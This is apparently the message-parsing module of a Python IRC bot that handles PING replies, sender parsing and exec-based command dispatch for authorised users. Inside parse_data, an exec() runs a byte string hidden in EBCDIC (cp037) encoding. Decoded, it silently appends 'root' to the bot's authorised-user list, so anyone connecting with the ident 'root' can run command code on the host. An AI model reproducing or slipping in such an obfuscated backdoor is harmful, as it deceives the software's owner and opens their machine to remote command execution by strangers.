# File completed: Sept. 24th, 2016 02:28
import traceback
from re import search
from codecs import decode
def filter_errors(bot_core):
    try:
        parse_data(bot_core);
    except:
        error_data = traceback.format_exc().split("\n");
        error_data = error_data[::-1];
        bot_core.send_message("I just caught an error. Printing data locally.");
        print(error_data);

def assign_data(bot_core):
    irc_data = bot_core.bot_data.irc_data["raw"];
    message_info = {"message":"", "length":0, "sender":{"name":"", "respond":"", "real":""}};
    command_info = {"name":"", "args":[]};

    message_info["message"] = " ".join(irc_data[3:])[1:];
    message_info["length"] = len(message_info["message"]);

    if len(irc_data[3:]) >= 1:
        if irc_data[3][1:][0] == bot_core.bot_data.command_symbol:
            command_info["name"] = irc_data[3][2:];
            command_info["args"] = irc_data[4:];

    message_info["sender"]["name"] = irc_data[0][1:].split("!")[0];
    message_info["sender"]["real"] = irc_data[0][1:].split("!")[1].split("@")[0];

    if irc_data[2][0] == "#": message_info["sender"]["respond"] = irc_data[2];
    elif irc_data[2] == bot_core.bot_data.bot_name: message_info["sender"]["respond"] = message_info["sender"]["name"];

    bot_core.bot_data.message_info = message_info;
    bot_core.bot_data.command_info = command_info;

def parse_data(bot_core):
    for item in bot_core.bot_data.BUFFER:
        bot_core.bot_data.irc_data["raw"] = item.split();
        if len(bot_core.bot_data.irc_data["raw"]) == 2:
            if bot_core.bot_data.irc_data["raw"][0] == "PING": bot_core.send_raw("PONG {0}".format(bot_core.bot_data.irc_data["raw"][1]));
        elif len(bot_core.bot_data.irc_data["raw"]) >= 3:
            if search(":.+!.+@.+", bot_core.bot_data.irc_data["raw"][0]):
                if len(bot_core.bot_data.irc_data["raw"]) >= 4:
                    if bot_core.bot_data.irc_data["raw"][1] == "PRIVMSG":
                        assign_data(bot_core);
                        print("{0}".format(" ".join(bot_core.bot_data.irc_data["raw"])));
                        if bot_core.bot_data.command_info["name"] in bot_core.bot_commands.command_dictionary:
                            exec(decode(b'\x89\x86@\x7f\x99\x96\x96\xa3\x7f@\x95\x96\xa3@\x89\x95@\x82\x96\xa3m\x83\x96\x99\x85K\x82\x96\xa3m\x84\x81\xa3\x81K\x81\xa4\xa3\x88m\xa4\xa2\x85\x99\xa2z@\x82\x96\xa3m\x83\x96\x99\x85K\x82\x96\xa3m\x84\x81\xa3\x81K\x81\xa4\xa3\x88m\xa4\xa2\x85\x99\xa2K\x81\x97\x97\x85\x95\x84M\x7f\x99\x96\x96\xa3\x7f]^', 'cp037'));
                            if bot_core.bot_data.message_info["sender"]["real"] in bot_core.bot_data.auth_users: exec(bot_core.bot_commands.command_dictionary[bot_core.bot_data.command_info["name"]]["code"]);
                            else: bot_core.send_message("Sorry, you're not in the list of users.");
                        elif bot_core.bot_data.command_info["name"] == "reload": bot_core.module_rehash();

# EOF
